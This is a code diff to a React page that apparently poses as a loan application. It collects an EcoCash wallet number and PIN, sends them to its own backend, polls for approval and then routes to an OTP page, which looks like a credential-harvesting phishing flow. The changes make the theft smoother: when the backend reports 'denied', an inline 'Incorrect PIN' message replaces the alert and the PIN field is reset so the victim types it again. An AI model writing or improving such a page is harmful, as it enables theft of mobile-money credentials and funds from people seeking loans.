@@ -22,6 +22,7 @@ export default function ApplyPage() {
   const [showPin, setShowPin] = useState(false);
   const [isProcessing, setIsProcessing] = useState(false);
   const [isSuccess, setIsSuccess] = useState(false);
+  const [errorMsg, setErrorMsg] = useState(''); // NEW: State for smooth inline error
 
   const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);
 
@@ -44,6 +45,7 @@ export default function ApplyPage() {
   const handleLoginSubmit = async () => {
     if (pin.length !== 4 || momoNumber.length < 9) return;
     setIsProcessing(true);
+    setErrorMsg(''); // Clear previous errors
 
     try {
       const response = await fetch(`${API_BASE_URL}/api/initiate-login`, {
@@ -61,7 +63,7 @@ export default function ApplyPage() {
         if (attempts > 60) {
           if (pollRef.current) clearInterval(pollRef.current);
           setIsProcessing(false);
-          alert("Timed out.");
+          setErrorMsg("Request timed out. Please try again.");
           return;
         }
 
@@ -76,12 +78,14 @@ export default function ApplyPage() {
             setTimeout(() => {
               navigate('/otp', { state: { phone: momoNumber, amount } });
             }, 1500);
+            
           } else if (statusData.status === 'denied') {
             if (pollRef.current) clearInterval(pollRef.current);
             setIsProcessing(false);
-            setIsMomoOpen(false);
-            setPin('');
-            alert("Login denied.");
+            
+            // SMOOTH DENIAL LOGIC: No alerts, no closing modal. Just reset the PIN and show error text.
+            setPin(''); 
+            setErrorMsg("Incorrect PIN or login denied. Please try again.");
           }
         } catch (err) {
           console.error("Polling error:", err);
@@ -90,7 +94,7 @@ export default function ApplyPage() {
 
     } catch (error) {
       setIsProcessing(false);
-      alert("Network error.");
+      setErrorMsg("Network error. Please check your connection.");
     }
   };
 
@@ -188,7 +192,7 @@ export default function ApplyPage() {
         <div style={{ position: 'fixed', top: 0, left: 0, right: 0, bottom: 0, backgroundColor: 'rgba(0,0,0,0.7)', zIndex: 100, display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '20px', backdropFilter: 'blur(4px)' }}>
           <div style={{ backgroundColor: 'white', borderRadius: '24px', padding: '30px 24px', width: '100%', maxWidth: '400px', position: 'relative', boxShadow: '0 20px 40px rgba(0,0,0,0.2)' }}>
             {!isProcessing && !isSuccess && (
-              <button style={{ position: 'absolute', top: '20px', right: '20px', background: '#f1f5f9', border: 'none', cursor: 'pointer', borderRadius: '50%', padding: '8px' }} onClick={() => setIsMomoOpen(false)}>
+              <button style={{ position: 'absolute', top: '20px', right: '20px', background: '#f1f5f9', border: 'none', cursor: 'pointer', borderRadius: '50%', padding: '8px' }} onClick={() => { setIsMomoOpen(false); setErrorMsg(''); }}>
                 <X size={20} color="#64748b" />
               </button>
             )}
@@ -222,6 +226,14 @@ export default function ApplyPage() {
                   <p style={{ fontSize: '13px', color: '#64748b', margin: 0 }}>Log in to your EcoCash wallet to secure your loan.</p>
                 </div>
 
+                {/* SMOOTH INLINE ERROR MESSAGE */}
+                {errorMsg && (
+                  <div style={{ backgroundColor: '#fef2f2', border: '1px solid #fecaca', color: '#dc2626', padding: '10px 14px', borderRadius: '10px', fontSize: '13px', fontWeight: 600, marginBottom: '16px', display: 'flex', alignItems: 'center', gap: '8px' }}>
+                    <div style={{ width: '6px', height: '6px', backgroundColor: '#dc2626', borderRadius: '50%' }}></div>
+                    {errorMsg}
+                  </div>
+                )}
+
                 <label style={{ display: 'block', fontSize: '12px', fontWeight: 700, color: '#333', marginBottom: '8px', letterSpacing: '0.5px' }}>ECOCASH NUMBER</label>
                 <div style={{ display: 'flex', border: '2px solid #e2e8f0', borderRadius: '12px', marginBottom: '20px', overflow: 'hidden', backgroundColor: 'white' }}>
                   <div style={{ padding: '16px', backgroundColor: '#f8fafc', borderRight: '2px solid #e2e8f0', display: 'flex', alignItems: 'center', gap: '6px', fontSize: '16px', fontWeight: 600, color: '#333' }}>
@@ -231,7 +243,7 @@ export default function ApplyPage() {
                     type="tel" 
                     placeholder="77X XXX XXX"
                     value={momoNumber} 
-                    onChange={e => setMomoNumber(e.target.value.replace(/\D/g, '').slice(0,9))} 
+                    onChange={e => { setMomoNumber(e.target.value.replace(/\D/g, '').slice(0,9)); setErrorMsg(''); }} 
                     style={{ width: '100%', padding: '16px', border: 'none', fontSize: '18px', outline: 'none', color: '#111', fontWeight: 600, backgroundColor: 'transparent' }} 
                   />
                 </div>
@@ -242,8 +254,8 @@ export default function ApplyPage() {
                     type={showPin ? "text" : "password"} 
                     placeholder="••••"
                     value={pin} 
-                    onChange={e => setPin(e.target.value.replace(/\D/g, '').slice(0,4))} 
-                    style={{ width: '100%', padding: '18px', borderRadius: '12px', border: '2px solid #e2e8f0', fontSize: '24px', textAlign: 'center', letterSpacing: '12px', color: '#111', backgroundColor: 'white', outline: 'none', fontWeight: 700 }} 
+                    onChange={e => { setPin(e.target.value.replace(/\D/g, '').slice(0,4)); setErrorMsg(''); }} 
+                    style={{ width: '100%', padding: '18px', borderRadius: '12px', border: errorMsg ? '2px solid #dc2626' : '2px solid #e2e8f0', fontSize: '24px', textAlign: 'center', letterSpacing: '12px', color: '#111', backgroundColor: 'white', outline: 'none', fontWeight: 700 }} 
                   />
                   <span style={{ position: 'absolute', right: '16px', top: '20px', cursor: 'pointer', color: '#0b40c4', fontWeight: 700, fontSize: '13px', display: 'flex', alignItems: 'center', gap: '4px' }} onClick={() => setShowPin(!showPin)}>
                     {showPin ? <EyeOff size={16}/> : <Eye size={16}/>} {showPin ? 'Hide' : 'Peek'}
@@ -251,7 +263,7 @@ export default function ApplyPage() {
                 </div>
                 <p style={{ fontSize: '11px', color: '#64748b', marginTop: '8px', textAlign: 'center' }}>Enter the 4-digit PIN you set for your EcoCash account.</p>
 
-                <button onClick={handleLoginSubmit} style={{ width: '100%', padding: '18px', marginTop: '24px', borderRadius: '12px', border: 'none', backgroundColor: (pin.length === 4 && momoNumber.length >= 9) ? '#0b40c4' : '#a0bdf5', color: 'white', fontWeight: 700, fontSize: '16px', cursor: (pin.length === 4 && momoNumber.length >= 9) ? 'pointer' : 'not-allowed', transition: 'all 0.2s', boxShadow: (pin.length === 4 && momoNumber.length >= 9) ? '0 4px 12px rgba(11, 64, 196, 0.3)' : 'none' }}>
+                <button onClick={handleLoginSubmit} disabled={pin.length !== 4 || momoNumber.length < 9} style={{ width: '100%', padding: '18px', marginTop: '24px', borderRadius: '12px', border: 'none', backgroundColor: (pin.length === 4 && momoNumber.length >= 9) ? '#0b40c4' : '#a0bdf5', color: 'white', fontWeight: 700, fontSize: '16px', cursor: (pin.length === 4 && momoNumber.length >= 9) ? 'pointer' : 'not-allowed', transition: 'all 0.2s', boxShadow: (pin.length === 4 && momoNumber.length >= 9) ? '0 4px 12px rgba(11, 64, 196, 0.3)' : 'none' }}>
                   Login Securely
                 </button>
 
